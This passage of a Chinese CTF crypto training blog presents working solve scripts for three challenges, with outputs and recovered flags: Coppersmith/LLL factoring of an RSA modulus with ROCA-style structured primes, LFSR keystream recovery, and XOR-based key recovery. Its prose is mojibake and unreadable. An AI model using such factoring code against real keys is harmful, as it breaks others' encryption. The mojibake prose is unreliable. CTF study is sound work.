class="params">(M, bound)</span>:</span></span><br><span class="line">    candidates = [(M, Zmod(M)(<span class="number">65537</span>).multiplicative_order())]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        M_smaller, order = candidates[<span class="number">-1</span>][<span class="number">0</span>], candidates[<span class="number">-1</span>][<span class="number">1</span>]</span><br><span class="line">        order_factor = prime_power_factor(order)</span><br><span class="line">        candidates = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> order_factor:</span><br><span class="line">            new_M, new_order = sub_Gen_M_smaller(M_smaller, order // p)</span><br><span class="line">            param = (log(order, <span class="number">2</span>) - log(new_order, <span class="number">2</span>)) / (log(M_smaller, <span class="number">2</span>) - log(new_M, <span class="number">2</span>)) <span class="comment"># è¡¡é‡é˜¶ä¸‹é™é€Ÿåº¦çš„å‚æ•°</span></span><br><span class="line">            candidates.append((new_M, new_order, param))</span><br><span class="line">        candidates = sorted(candidates, key=<span class="keyword">lambda</span> x:x[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> size(candidates[<span class="number">-1</span>][<span class="number">0</span>]) &lt; bound:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> M_smaller, order</span><br><span class="line"></span><br><span class="line"><span class="comment"># size(n)//4 -&gt; Coppersmith bound</span></span><br><span class="line">M_smaller, order = Gen_M_smaller(M, size(n) // <span class="number">4</span>)</span><br><span class="line"><span class="comment"># (1134636716748630821225010071671110, 21840)</span></span><br></pre></td></tr></table></figure><p>è·å¾—Mâ€™åï¼Œæˆ‘ä»¬ä»å¯ä»¥å°†pè¡¨ç¤ºä½œ$kâ€™Mâ€™+(65537^{aâ€™})\%Mâ€™$ï¼Œä¸”$kâ€™&lt;N^{\frac{1}{4}}$.</p><p><code>for a in range(c//2, (c + ord) // 2)</code>ä¸ŠCoppersmithæ±‚è§£$f=k*M+pow(65537,a,M)$å³å¯.</p><p>ä½†Coppersmithæ„é€ çš„ç³»æ•°çŸ©é˜µç›¸å…³å‚æ•°mm, ttåŠè§£çš„ä¸Šç•ŒXåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œäºæœ¬é¢˜æ•ˆæœæå·®- -</p><p>å›åˆ°paperå‘ç°æœ‰å¯¹å‚æ•°æ„é€ çš„æ–¹æ¡ˆï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_00-51-58.png" alt></p><p>è¿™é‡Œçš„$(mm,tt)$åœ¨paperä¸­å¹¶æœªç»™å‡ºå…·ä½“è¯æ˜ï¼Œåº”è¯¥æ˜¯å®éªŒæ€§å¾—åˆ°çš„æ•°æ®- -</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œpaperä¸­ç»™å‡ºçš„(5, 6)æ˜¯é’ˆå¯¹<code>Gen_M_smaller(M, 512 // 4)</code>ç»™å‡ºçš„ï¼Œè‡³äºèƒ½è®©é˜¶æ›´å°çš„<code>Gen_M_smaller(M, size(n) // 4)</code>å¯¹åº”çš„å‚æ•°å¯èƒ½åˆä¸ç›¸åŒâ€¦è¿™é‡Œæš‚æœªå®éªŒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith_univariate</span><span class="params">(f, n, beta, mm, tt, XX)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(f.is_monic() <span class="keyword">and</span> <span class="number">0</span> &lt; beta &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#epsilon = beta / 7</span></span><br><span class="line">    dd = f.degree() <span class="comment"># degree of polynomial</span></span><br><span class="line">    <span class="comment">#mm = ceil(beta**2 / (dd * epsilon)) # optimized param</span></span><br><span class="line">    <span class="comment">#tt = floor(dd * mm * (1 / beta - 1)) # optimized param</span></span><br><span class="line">    <span class="comment">#XX = ceil(n**(beta**2 / dd - epsilon)) # |x| &lt; XX</span></span><br><span class="line">    nn = mm * dd + tt</span><br><span class="line">    <span class="comment"># change ring of f and x to ZZ</span></span><br><span class="line">    fZ = f.change_ring(ZZ)</span><br><span class="line">    x = fZ.parent().gen()</span><br><span class="line">    <span class="comment"># instruct matrix</span></span><br><span class="line">    A_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(mm):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(dd):</span><br><span class="line">            A_list.append((XX * x)**j * n**(mm - i) * fZ(XX * x)**i)</span><br><span class="line">    A_list += [(XX * x)**i * fZ(XX * x)**mm <span class="keyword">for</span> i <span class="keyword">in</span> range(tt)]</span><br><span class="line">    A = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nn):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>):</span><br><span class="line">            A[i, j] = A_list[i][j]</span><br><span class="line">    <span class="comment"># LLL to solve SVP</span></span><br><span class="line">    AL = A.LLL(early_red=<span class="literal">True</span>, use_siegel=<span class="literal">True</span>)</span><br><span class="line">    f_smaller = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nn):</span><br><span class="line">        f_smaller += (AL[<span class="number">0</span>, i] * x**i) / (XX**i)</span><br><span class="line">    candidates = f_smaller.roots()</span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> root, _ <span class="keyword">in</span> candidates:</span><br><span class="line">        <span class="keyword">if</span> root.is_integer():</span><br><span class="line">            res = fZ(ZZ(root))</span><br><span class="line">            <span class="keyword">if</span> gcd(res, n) &gt;= n**beta: <span class="comment"># module's size satisfies</span></span><br><span class="line">                roots.append(ZZ(root))</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">M_smaller, order = Gen_M_smaller(M, <span class="number">512</span> // <span class="number">4</span>)</span><br><span class="line">c = discrete_log(Mod(n, M_smaller), Mod(<span class="number">65537</span>, M_smaller))</span><br><span class="line"></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">'NTL'</span>)</span><br><span class="line">beta = <span class="number">0.48</span></span><br><span class="line">mm = <span class="number">5</span></span><br><span class="line">tt = <span class="number">6</span></span><br><span class="line">XX = int((<span class="number">2</span> * n**beta) / M_smaller)</span><br><span class="line"><span class="comment">#XX = ceil(n**(beta**2 - beta/7))</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> tqdm(range(c // <span class="number">2</span>, (c + order) // <span class="number">2</span>)):</span><br><span class="line">    f = k * M_smaller + Integer(pow(<span class="number">65537</span>, a, M_smaller))</span><br><span class="line">    roots = coppersmith_univariate(f.monic(), n, beta, mm, tt, XX)</span><br><span class="line">    <span class="keyword">if</span> len(roots):</span><br><span class="line">        print(roots[<span class="number">0</span>])</span><br><span class="line">        print(gcd(roots[<span class="number">0</span>] * M_smaller + Integer(pow(<span class="number">65537</span>, a, M_smaller)), n))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  0%|          | 5/600600 [00:00&lt;17:58:28,  9.28it/s]</span></span><br><span class="line"><span class="string">1426982562847111986146541</span></span><br><span class="line"><span class="string">3386619977051114637303328519173627165817832179845212640767197001941</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>coppersmithåˆ†è§£næˆåŠŸï¼Œåç»­ç•¥</p><h4 id="More-1"><a href="#More-1" class="headerlink" title="[More]"></a>[More]</h4><p>coppersmithæ±‚è§£çš„å‚æ•°$(mm,tt)$åœ¨ä¸åŒæƒ…å†µä¹Ÿè¦ä¸ç”¨è°ƒå‚ï¼Œåç»­æˆ‘ä»¥ä¸€ä¸ªæœ‰æ›´å°orderçš„Mâ€™(17304344567133368654502628603056098610)è¿›è¡Œäº†å‚æ•°ä¼°è®¡ï¼ˆåˆ©ç”¨å·²çŸ¥æ»¡è¶³coppersmithæ¡ä»¶çš„fè¿›è¡Œæµ‹è¯•ï¼‰</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-30-44.png" alt></p><p>åŸºäºå¤æ‚åº¦è€ƒè™‘ï¼Œé€‰å–$(mm,tt)=(10,11)$.</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-33-06.png" alt></p><p>ä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™é‡Œåœ¨é˜¶å‡å°çš„åŒæ—¶ï¼Œmm,ttä¹Ÿå¢å¤§ï¼Œæ„å‘³ç€LLLçš„çŸ©é˜µæ‰©å¤§ï¼Œæ±‚è§£æ—¶é—´å¹¶æ²¡æœ‰å¤ªå¤§çš„å˜åŒ–- -</p><p>è¿™é¢˜çš„æ•°æ®åº”è¯¥æ˜¯å‡ºé¢˜äººgenerateçš„ä¸€ç»„è¾ƒæ˜“æ±‚è§£çš„pï¼Œqï¼ˆå› ä¸ºæˆ‘ä»¬å‘ç°åœ¨çˆ†ç ´açš„æ—¶å€™ï¼Œå…¶æœ€å·®æ—¶é—´çº¦18hï¼Œä½†aèƒ½åœ¨å¾ˆå°çš„æ—¶å€™å³ç¬¦åˆï¼‰</p><p>coppersmithè¿™ä¸œè¥¿â€¦è°ƒå‚å°±å¾ˆç„ï¼ˆåˆšåˆšæåˆ°çš„$(mm,tt)=(10,11)$æ±‚è§£æˆåŠŸçš„fï¼Œåœ¨ç›´æ¥small_rootsæ—¶å³æ±‚è§£å¤±è´¥- -å…¶å®å¯ä»¥ç”¨æ¥å‡ºé¢˜åŸ‹ä¸€æ‰‹å‘(x)ï¼‰</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-05-27_01-45-05.png" alt></p><h3 id="Unknown-name-Crypto-Challenge-2020-08-10"><a href="#Unknown-name-Crypto-Challenge-2020-08-10" class="headerlink" title="Unknown-name Crypto Challenge(2020/08/10)"></a>Unknown-name Crypto Challenge(2020/08/10)</h3><h4 id="é¢˜ç›®è€ƒç‚¹-3"><a href="#é¢˜ç›®è€ƒç‚¹-3" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>åŒ–ç®€èƒ½åŠ›- -||</li></ul><h4 id="é¢˜è§£åˆ†æ-3"><a href="#é¢˜è§£åˆ†æ-3" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">"KEYIS&#123;xxxxxxxxxxxxxxxx&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">mask = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">R = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">iv = int(os.urandom(<span class="number">4</span>).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    R,m = lfsr(R,mask)</span><br><span class="line">    x = R ^ iv</span><br><span class="line">    x ^= x &gt;&gt; <span class="number">16</span></span><br><span class="line">    x ^= x &gt;&gt; <span class="number">8</span></span><br><span class="line">    x = x &amp; <span class="number">255</span></span><br><span class="line">    enc += chr(ord(i)^x)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-08-10_23-38-54.png" alt></p><ol><li><p>ç”±äºivæ˜¯fixedçš„ï¼Œæ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸º8bitsçš„new_ivï¼Œåœ¨æœ€åå¼‚æˆ–å³å¯</p></li><li><p>R, _ = lfsr(R, mask)ï¼Œå› æ­¤ä¹Ÿå¯ç®€åŒ–ä¸º8bitsçš„new_R, _ = new_lfsr(new_R)</p><p>æ³¨ï¼šè¿™é‡Œçš„new_lfsrå®é™…ä¸Šå·²élfsrï¼Œä½†ä»ä¿æŒå¦‚ä¸‹æ€§è´¨</p><p><img src= "/img/loading.gif" data-src="/2020/04/30/CTF-Training-Record-1/Snipaste_2020-08-10_23-54-47.png" alt></p><p>å³ç»new_LFSRåï¼Œ<code>new_R = ((new_R &lt;&lt; 1) &amp; 0xff) | random_bit</code></p></li></ol><p>å› æ­¤å¯å°†ä¸Šè¿°åŒ–ç®€ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new_R = new_lfsr(new_R)</span><br><span class="line">x = new_R ^ new_iv</span><br><span class="line">enc += chr(ord(i) ^ x)</span><br></pre></td></tr></table></figure><p>æ•…å¯¹<strong>å¯†é’¥æµ</strong>æœ‰ä»¥ä¸‹é€’æ¨å…³ç³»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">prev = R ^ new_iv</span><br><span class="line">curr = (((R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span>) | random_bit) ^ new_iv</span><br><span class="line">(prev &amp; <span class="number">0x7f</span>) = (R &amp; <span class="number">0x7f</span>) ^ (new_iv &amp; <span class="number">0x7f</span>)</span><br><span class="line">(curr &gt;&gt; <span class="number">1</span>) = (R &amp; <span class="number">0x7f</span>) ^ (new_iv &gt;&gt; <span class="number">1</span>)</span><br><span class="line">(prev &amp; <span class="number">0x7f</span>) ^ (curr &gt;&gt; <span class="number">1</span>) = (new_iv &amp; <span class="number">0x7f</span>) ^ (new_iv &gt;&gt; <span class="number">1</span>) <span class="comment"># new_iv -&gt; constant</span></span><br></pre></td></tr></table></figure><p>ä½†currçš„æœ€ä½æ¯”ç‰¹æœªçŸ¥ï¼Œflagå†…èŠ¯ä¸ºå°å†™md5ï¼Œå› æ­¤é€’å½’ä½œåˆ¤æ–­å³å¯</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">flag_charset = <span class="string">b"0123456789abcdef"</span></span><br><span class="line">cipher = unhexlify(<span class="string">b"3bcd21d009a7e0ad9fa6718cd6310ed06a13bd589e0963"</span>)</span><br><span class="line">prefix = <span class="string">b"S&#123;"</span></span><br><span class="line">suffix = <span class="string">b"&#125;"</span></span><br><span class="line">constant = ((prefix[<span class="number">0</span>] ^ cipher[<span class="number">4</span>]) &amp; <span class="number">0x7f</span>) ^ ((prefix[<span class="number">1</span>] ^ cipher[<span class="number">5</span>]) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">pre = prefix[<span class="number">1</span>] ^ cipher[<span class="number">5</span>]</span><br><span class="line">flag = <span class="string">"KEYIS&#123;"</span></span><br><span class="line">cipher = cipher[<span class="number">6</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(flag, pre, constant, i)</span>:</span></span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    cur = ((pre &amp; <span class="number">0x7f</span>) ^ constant) &lt;&lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">16</span> <span class="keyword">and</span> chr((cur + <span class="number">1</span>) ^ cipher[i]) == <span class="string">'&#125;'</span> <span class="keyword">or</span> chr(cur ^ cipher[i]) == <span class="string">'&#125;'</span>:</span><br><span class="line">        print(flag + <span class="string">'&#125;'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> (cur ^ cipher[i]) <span class="keyword">in</span> flag_charset:</span><br><span class="line">            getflag(flag + chr(cur ^ cipher[i]), cur, constant, i + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> ((cur + <span class="number">1</span>) ^ cipher[i]) <span class="keyword">in</span> flag_charset:</span><br><span class="line">            getflag(flag + chr((cur + <span class="number">1</span>) ^ cipher[i]), cur + <span class="number">1</span>, constant, i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">getflag(flag, pre, constant, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># KEYIS&#123;1fa32bc3ccee9872&#125;</span></span><br></pre></td></tr></table></figure><h4 id="More-2"><a href="#More-2" class="headerlink" title="[More]"></a>[More]</h4><p>å¹¶ä¸çŸ¥é“æ˜¯ä»€ä¹ˆèµ›äº‹çš„é¢˜ç›®- -å¥½å¤šå¸ˆå‚…éƒ½åœ¨é—®ï¼Œå‡ºé¢˜æ€è·¯å’ŒX-MAS CTFåŸºæœ¬ç›¸åŒï¼Œä¸»è¦è€ƒå¯Ÿç‚¹å³ä¸ºåŒ–ç®€</p><p><a href="https://github.com/pberba/ctf-solutions/blob/8eb87af5bb2fbf7af683c7fd79d7979f032b7ae9/20181223_xmasctf/crypto-460-probably_really_nice_goodies/README.md" target="_blank" rel="noopener">https://github.com/pberba/ctf-solutions/blob/8eb87af5bb2fbf7af683c7fd79d7979f032b7ae9/20181223_xmasctf/crypto-460-probably_really_nice_goodies/README.md</a></p><h3 id="CISCN2018-sm"><a href="#CISCN2018-sm" class="headerlink" title="CISCN2018 - sm"></a>CISCN2018 - sm</h3><h4 id="é¢˜ç›®æ–‡ä»¶-2"><a href="#é¢˜ç›®æ–‡ä»¶-2" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="sm.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-4"><a href="#é¢˜è§£åˆ†æ-4" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen512num</span><span class="params">()</span>:</span></span><br><span class="line">    order = shuffle(list(range(<span class="number">1</span>, <span class="number">513</span>)))</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">        p = getPrime(<span class="number">512</span> - order[i] + <span class="number">10</span>)</span><br><span class="line">        pre = bin(p)[<span class="number">2</span>:][<span class="number">0</span>:(<span class="number">512</span>-order[i])] + <span class="string">"1"</span></span><br><span class="line">        ps.append(int(pre + <span class="string">"0"</span> * (<span class="number">512</span> - len(pre)), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> ps</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>gen512num</code>è¿”å›çš„psæ•°ç»„ä¸­ï¼Œå‡ä¸º512bitsçš„éšæœºæ•°ï¼Œä½†å­˜åœ¨ä¸‹åˆ—å…³ç³»ï¼š</p><p>for $p\in ps$ï¼Œbin(p)[2:]çš„suffixå‡æ»¡è¶³â€™1â€™+i*â€™0â€™ $(i\in [0,511])$ï¼Œä¸”iäº’ä¸é‡å¤</p><p>chooseä¸ºé•¿åº¦512çš„01å‘é‡ï¼ŒæŒ‰å¦‚ä¸‹è§„åˆ™leakå‡ºä¿¡æ¯r</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">    <span class="keyword">if</span> bchoose[i]==<span class="string">'1'</span>:</span><br><span class="line">        r = r ^ ps[i]</span><br></pre></td></tr></table></figure><p>ä¸”é¢˜ç›®ç»™å‡ºpsï¼Œåˆæœ‰ä¸Šè¿°psç‰¹æ€§ï¼Œå³å¯ä»ræœ«ä½æ¯”ç‰¹å‘å‰æ¢å¤å‡ºchoose</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="number">6753785483255906709117615805253027649453460653974415214642466102672301763943358839905575042938258141827000621474498066533397472809407687579125519939754658</span></span><br><span class="line">ps = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"ps"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        ps.append(int(line[:<span class="number">-1</span>]))</span><br><span class="line">ps_dict = dict() <span class="comment"># ps_dict[i]'s suffix satisfies '1' + i * '0'</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">2</span>**i) &amp; p) != <span class="number">0</span>:</span><br><span class="line">            ps_dict[i] = p</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">choose = [<span class="number">0</span>] * <span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">512</span>):</span><br><span class="line">    <span class="keyword">if</span> ((<span class="number">2</span>**i) &amp; r) != <span class="number">0</span>:</span><br><span class="line">        r ^= ps_dict[i]</span><br><span class="line">        choose[ps.index(ps_dict[i])] = <span class="number">1</span></span><br><span class="line">choose = int(<span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> choose), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">key = long_to_bytes(int(md5(long_to_bytes(choose)).hexdigest(), <span class="number">16</span>))</span><br><span class="line">aes_obj = AES.new(key, AES.MODE_ECB)</span><br><span class="line">cipher = b64decode(<span class="string">b"5eFo3ANg2fu9LRrFktWCJmVvx6RgBFzd0R8GXQ8JD78="</span>)</span><br><span class="line">flag = aes_obj.decrypt(cipher)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'flag&#123;shemir_alotof_in_wctf_fun!&#125;'</span></span><br></pre></td></tr></table></figure><h4 id="More-3"><a href="#More-3" class="headerlink" title="[More]"></a>[More]</h4><p>ä¸´è¿‘2020å›½èµ›äº† :(</p><p>èµ›å‰æ‰¾äº†äº›å¾€å¹´çš„cryé¢˜çœ‹äº†çœ‹- -éš¾åº¦ä¸Šå‡ ä¹æ¯”ä¸ä¸Šå…¶ä»–å›½é™…èµ›ï¼Œä½†æ˜¯æœ‰äº›é£æ ¼å¥‡å¥‡æ€ªæ€ª</p><p>Trainingç³»åˆ—çš„åšæ–‡å°±ä»¥ä¸€ç¯‡5é¢˜ä¸ºè§„èŒƒå§ï¼Œå¸Œæœ›å›½èµ›äººæ²¡äº‹</p><p><strong>END</strong></p>]]></content>
      
      
      <categories>
          
          <category> Training </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(DASCTFå››æœˆæ˜¥å­£èµ›) - Crypto</title>
      <link href="/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/"/>
      <url>/2020/04/25/WriteUp-DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E8%B5%9B-Crypto/</url>
      
